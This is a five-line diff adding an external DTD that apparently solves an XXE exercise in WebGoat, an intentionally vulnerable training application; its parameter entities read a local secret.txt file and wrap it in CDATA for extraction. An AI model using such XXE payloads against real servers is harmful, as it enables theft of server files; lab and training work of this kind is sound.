@@ -1,0 +1,5 @@
+<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.0.0.M24/XXE/secret.txt">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY fileContents
+'%start;%file;%end;'>">
